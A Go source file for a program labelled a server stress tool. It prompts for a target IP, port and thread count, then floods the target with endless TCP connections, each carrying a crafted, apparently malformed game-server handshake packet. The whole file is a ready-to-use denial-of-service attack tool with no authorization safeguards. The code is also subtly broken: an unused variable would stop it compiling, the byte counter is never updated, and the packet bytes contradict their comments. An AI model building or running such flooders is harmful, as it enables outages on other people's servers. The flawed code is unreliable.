package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

var totalDataSent int64 = 0
var debug = false // Set this to true if you want to see error messages

func stressServer(address string, wg *sync.WaitGroup, packet []byte) {
	defer wg.Done()

	for {
		conn, err := net.Dial("tcp", address)
		if err != nil {
			if debug {
				log.Println("Error connecting:", err)
			}
			continue // Continue to the next iteration to retry connecting
		}

		// Send the packet
		_, err = conn.Write(packet)
		if err != nil && debug {
			log.Println("Error writing to connection:", err)
		}

		// Send the additional data
		_, err = conn.Write([]byte{0x01, 0x00})
		if err != nil && debug {
			log.Println("Error writing additional data to connection:", err)
		}

		conn.Close()
	}
}

func printBandwidth() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		switch {
		case totalDataSent > 1<<30:
			fmt.Printf("\rTotal data sent: %.2f GB", float64(totalDataSent)/(1<<30))
		case totalDataSent > 1<<20:
			fmt.Printf("\rTotal data sent: %.2f MB", float64(totalDataSent)/(1<<20))
		case totalDataSent > 1<<10:
			fmt.Printf("\rTotal data sent: %.2f KB", float64(totalDataSent)/(1<<10))
		default:
			fmt.Printf("\rTotal data sent: %d bytes", totalDataSent)
		}
		totalDataSent = 0
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter IP: ")
	ip, _ := reader.ReadString('\n')
	ip = ip[:len(ip)-1] // Remove newline character

	fmt.Print("Enter port: ")
	port, _ := reader.ReadString('\n')
	port = port[:len(port)-1] // Remove newline character

	fmt.Print("Enter amount of threads: ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = threadsStr[:len(threadsStr)-1] // Remove newline character
	threads, err := strconv.Atoi(threadsStr)
	if err != nil {
		log.Fatal(err)
	}

	address := ip + ":" + port

	packet := []byte{
		0x03,
		0x64, // Pack varint for 100
		0x53, 0x44, 0xF0, // Pack string length as varint for 28
		0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A,
		0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, // UTF-8 encoded rocket emojis
		0xFF, 0xFF, // Max unsigned short value (65535)
		0x01,
	}

	data := make([]byte, 1024*1024) // 1MB
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go stressServer(address, &wg, packet) // Start a new goroutine
	}

	go printBandwidth()

	wg.Wait()
}
